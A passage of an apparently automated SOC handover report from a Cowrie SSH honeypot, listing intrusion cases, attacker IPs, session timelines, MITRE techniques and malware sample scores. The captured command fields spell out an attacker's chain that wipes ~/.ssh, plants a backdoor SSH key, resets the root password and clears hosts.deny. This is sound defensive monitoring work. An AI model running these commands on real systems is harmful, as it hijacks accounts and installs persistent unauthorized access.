| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Jl7qgpVl4Ziy"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 21:43:03` | `cowrie.session.connect` |
| `2026-03-28 21:43:03` | `cowrie.client.version` |
| `2026-03-28 21:43:03` | `cowrie.client.kex` |
| `2026-03-28 21:43:04` | `cowrie.login.success` |
| `2026-03-28 21:43:04` | `cowrie.session.params` |
| `2026-03-28 21:43:04` | `cowrie.command.input` |
| `2026-03-28 21:43:04` | `cowrie.command.failed` |
| `2026-03-28 21:43:04` | `cowrie.log.closed` |
| `2026-03-28 21:43:05` | `cowrie.session.params` |
| `2026-03-28 21:43:05` | `cowrie.command.input` |
| `2026-03-28 21:43:05` | `cowrie.session.file_download` |
| `2026-03-28 21:43:05` | `cowrie.log.closed` |
| `2026-03-28 21:43:17` | `cowrie.session.params` |
| `2026-03-28 21:43:17` | `cowrie.command.input` |
| `2026-03-28 21:43:17` | `cowrie.log.closed` |
| `2026-03-28 21:43:18` | `cowrie.session.params` |
| `2026-03-28 21:43:18` | `cowrie.command.input` |
| `2026-03-28 21:43:18` | `cowrie.log.closed` |
| `2026-03-28 21:43:18` | `cowrie.session.params` |
| `2026-03-28 21:43:18` | `cowrie.command.input` |
| `2026-03-28 21:43:18` | `cowrie.session.file_download` |
| `2026-03-28 21:43:18` | `cowrie.log.closed` |
| `2026-03-28 21:43:18` | `cowrie.session.params` |
| `2026-03-28 21:43:18` | `cowrie.command.input` |
| `2026-03-28 21:43:19` | `cowrie.log.closed` |
| `2026-03-28 21:43:19` | `cowrie.session.params` |
| `2026-03-28 21:43:19` | `cowrie.command.input` |
| `2026-03-28 21:43:19` | `cowrie.log.closed` |
| `2026-03-28 21:43:19` | `cowrie.session.params` |
| `2026-03-28 21:43:19` | `cowrie.command.input` |
| `2026-03-28 21:43:19` | `cowrie.command.input` |
| `2026-03-28 21:43:19` | `cowrie.log.closed` |
| `2026-03-28 21:43:20` | `cowrie.session.params` |
| `2026-03-28 21:43:20` | `cowrie.command.input` |
| `2026-03-28 21:43:20` | `cowrie.log.closed` |
| `2026-03-28 21:43:20` | `cowrie.session.params` |
| `2026-03-28 21:43:20` | `cowrie.command.input` |
| `2026-03-28 21:43:20` | `cowrie.log.closed` |
| `2026-03-28 21:43:21` | `cowrie.session.params` |
| `2026-03-28 21:43:21` | `cowrie.command.input` |
| `2026-03-28 21:43:21` | `cowrie.log.closed` |
| `2026-03-28 21:43:21` | `cowrie.session.params` |
| `2026-03-28 21:43:21` | `cowrie.command.input` |
| `2026-03-28 21:43:21` | `cowrie.log.closed` |
| `2026-03-28 21:43:21` | `cowrie.session.params` |
| `2026-03-28 21:43:21` | `cowrie.command.input` |
| `2026-03-28 21:43:22` | `cowrie.log.closed` |
| `2026-03-28 21:43:22` | `cowrie.session.params` |
| `2026-03-28 21:43:22` | `cowrie.command.input` |
| `2026-03-28 21:43:22` | `cowrie.log.closed` |
| `2026-03-28 21:43:22` | `cowrie.session.params` |
| `2026-03-28 21:43:22` | `cowrie.command.input` |
| `2026-03-28 21:43:22` | `cowrie.log.closed` |
| `2026-03-28 21:43:23` | `cowrie.session.params` |
| `2026-03-28 21:43:23` | `cowrie.command.input` |
| `2026-03-28 21:43:23` | `cowrie.log.closed` |
| `2026-03-28 21:43:23` | `cowrie.session.params` |
| `2026-03-28 21:43:23` | `cowrie.command.input` |
| `2026-03-28 21:43:23` | `cowrie.log.closed` |
| `2026-03-28 21:43:24` | `cowrie.session.params` |
| `2026-03-28 21:43:24` | `cowrie.command.input` |
| `2026-03-28 21:43:24` | `cowrie.log.closed` |
| `2026-03-28 21:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.91.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `101.91.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c36ca5455f0

| Field | Detail |
|---|---|
| **Source IP** | `101.32.128[.]193` |
| **First Seen** | 2026-03-28 22:19 |
| **Last Seen** | 2026-03-28 22:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 22:19:40` | `cowrie.session.connect` |
| `2026-03-28 22:19:40` | `cowrie.client.version` |
| `2026-03-28 22:19:40` | `cowrie.client.kex` |
| `2026-03-28 22:19:40` | `cowrie.login.success` |
| `2026-03-28 22:19:40` | `cowrie.session.params` |
| `2026-03-28 22:19:40` | `cowrie.command.input` |
| `2026-03-28 22:19:40` | `cowrie.command.failed` |
| `2026-03-28 22:19:40` | `cowrie.log.closed` |
| `2026-03-28 22:19:40` | `cowrie.session.params` |
| `2026-03-28 22:19:40` | `cowrie.command.input` |
| `2026-03-28 22:19:40` | `cowrie.session.file_download` |
| `2026-03-28 22:19:40` | `cowrie.log.closed` |
| `2026-03-28 22:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.128[.]193` to AbuseIPDB if not already reported
- [ ] Block `101.32.128[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fb24abdc96d

| Field | Detail |
|---|---|
| **Source IP** | `101.32.128[.]193` |
| **First Seen** | 2026-03-28 22:19 |
| **Last Seen** | 2026-03-28 22:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 22:19:42` | `cowrie.session.connect` |
| `2026-03-28 22:19:42` | `cowrie.client.version` |
| `2026-03-28 22:19:42` | `cowrie.client.kex` |
| `2026-03-28 22:19:42` | `cowrie.login.success` |
| `2026-03-28 22:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.128[.]193` to AbuseIPDB if not already reported
- [ ] Block `101.32.128[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.91.170[.]71` | **20** | 2026-03-28 20:35 | 2026-03-28 21:45 | 39m | 0 | `T1592` | 🟠 MEDIUM |
| `165.154.51[.]27` | **3** | 2026-03-28 21:28 | 2026-03-28 21:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.32.128[.]193` | 1 | 2026-03-28 22:19 | 2026-03-28 22:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.14.182[.]77` | 1 | 2026-03-28 21:56 | 2026-03-28 21:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.102.61[.]21` | 1 | 2026-03-28 21:02 | 2026-03-28 21:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.204.1[.]45` | 1 | 2026-03-28 21:15 | 2026-03-28 21:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.247.239[.]202` | 1 | 2026-03-28 21:19 | 2026-03-28 21:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.251.207[.]141` | 1 | 2026-03-28 20:55 | 2026-03-28 20:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.183.180[.]108` | 1 | 2026-03-28 22:16 | 2026-03-28 22:16 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.43.196[.]193` | 1 | 2026-03-28 21:34 | 2026-03-28 21:34 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.186.174[.]35` | 1 | 2026-03-28 21:38 | 2026-03-28 21:38 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.187.228[.]48` | 1 | 2026-03-28 20:39 | 2026-03-28 20:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.225.253[.]26` | 1 | 2026-03-28 20:37 | 2026-03-28 20:37 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.20.228[.]20` | 1 | 2026-03-28 21:42 | 2026-03-28 21:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.207.248[.]5` | 1 | 2026-03-28 20:57 | 2026-03-28 20:57 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.148[.]87` | 1 | 2026-03-28 21:22 | 2026-03-28 21:22 | 3s | 0 | `T1592` | 🟢 LOW |
| `211.20.26[.]201` | 1 | 2026-03-28 22:21 | 2026-03-28 22:21 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.25.233[.]22` | 1 | 2026-03-28 22:01 | 2026-03-28 22:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.182.185[.]190` | 1 | 2026-03-28 22:11 | 2026-03-28 22:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.117.173[.]94` | 1 | 2026-03-28 20:59 | 2026-03-28 20:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.247.139[.]54` | 1 | 2026-03-28 20:42 | 2026-03-28 20:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `60.173.105[.]206` | 1 | 2026-03-28 20:58 | 2026-03-28 20:58 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.23.115[.]214` | 1 | 2026-03-28 21:48 | 2026-03-28 21:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `69.180.188[.]173` | 1 | 2026-03-28 20:38 | 2026-03-28 20:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.225.109[.]18` | 1 | 2026-03-28 22:17 | 2026-03-28 22:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.231.249[.]182` | 1 | 2026-03-28 21:24 | 2026-03-28 21:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `221.182.185[.]190` | CN | China Mobile Communications Corporation | **100** ⚠️ | 27 |
| `81.225.109[.]18` | SE | Telia Network Services | **100** ⚠️ | 2 |
| `117.247.239[.]202` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |
| `165.154.51[.]27` | TH | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `95.231.249[.]182` | IT | Telecom Italia S.p.A. | **100** ⚠️ | 12 |
| `118.183.180[.]108` | CN | CHINANET Gansu province network | **100** ⚠️ | 41 |
| `69.180.188[.]173` | US | Comcast Cable Communications Holdings, Inc | **100** ⚠️ | 32 |
| `101.91.170[.]71` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 37 |
| `24.142.170[.]231` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `66.23.115[.]214` | CA | Beanfield Technologies Inc. | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 56 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 21 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 25 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 92 cases |
| Tool 34  | Credential Extractor        | ✅ 33 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (35.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 26 recon entry/entries in table (2 group(s) consolidating 23 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-28T22:27:23Z_
